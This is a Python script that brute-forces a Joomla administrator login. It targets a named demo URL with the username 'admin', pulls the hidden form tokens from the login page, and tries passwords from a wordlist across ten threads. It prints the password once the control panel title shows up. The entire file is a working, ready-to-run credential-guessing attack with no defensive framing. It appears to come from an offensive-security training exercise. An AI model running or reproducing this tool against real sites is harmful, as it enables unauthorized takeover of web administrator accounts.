import urllib.request
import urllib.parse
import http.cookiejar
import threading
import sys
from queue import Queue
from html.parser import HTMLParser

# general settings
user_thereads = 10
username = "admin"
wordlist_file = "cain.txt"
resume = None

# target specific settings
target_url = "https://demos4.softaculous.com/Joomla/administrator/index.php"
target_post = "https://demos4.softaculous.com/Joomla/administrator/index.php"

username_field = "username"
password_field = "passwd"

success_check = "Administration - Control Panel"

class BruteParser(HTMLParser):
	def __init__(self):
		HTMLParser.__init__(self)
		self.tag_results = {}

	def handle_starttag(self, tag, attrs):
		if tag == "input":
			tag_name = None
			tag_value = None
			for name, value in attrs:
				if name == "name":
					tag_name = value
				if name == "value":
					tag_value = value

				if tag_name is not None:
					self.tag_results[tag_name] = value

class Bruter(object):
	def __init__(self, username, words):
		self.username = username
		self.password_queue = words
		self.found = False
		print("Finished setting up for: {0}".format(self.username))

	def run_bruteforce(self):
		for i in range(user_thereads):
			t = threading.Thread(target=self.web_bruter)
			t.start()

	def web_bruter(self):
		while not self.password_queue.empty() and not self.found:
			brute = self.password_queue.get().rstrip()
			jar = http.cookiejar.FileCookieJar("cookies")
			opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
			response = opener.open(target_url)

			page = str(response.read())
			print("Trying {0} : {1} ({2} left)".format(self.username, brute, self.password_queue.qsize()))

			# parse out the hidden fields
			parser = BruteParser()
			parser.feed(page)

			post_tags = parser.tag_results

			# add our username and password fields
			post_tags[username_field] = self.username
			post_tags[password_field] = brute

			login_data = urllib.parse.urlencode(post_tags)
			login_response = opener.open(target_post, login_data.encode())

			login_result = str(login_response.read())

			if success_check in login_result:
				self.found = True # login successful
				print("[*] Bruteforce successful")
				print("[*] Username {0}".format(self.username))
				print("[*] Password {0}".format(brute))
				print("[*] Waiting for threads to exit...")

def build_wordlist(wordlist_file):
    # read in the wordlist
    fd = open(wordlist_file, "r")
    raw_words = fd.readlines()
    fd.close()

    found_resume = False
    words = Queue()
    
    for word in raw_words:
        word = word.rstrip()
        if resume is not None:
            if found_resume:
                words.put(word)
            else:
                if word == resume:
                    found_resume = True
                    print("Resuming wordlist from: {0}".format(resume))
        else:
            words.put(word)
    return words

words = build_wordlist(wordlist_file)
bruter_obj = Bruter(username, words)
bruter_obj.run_bruteforce()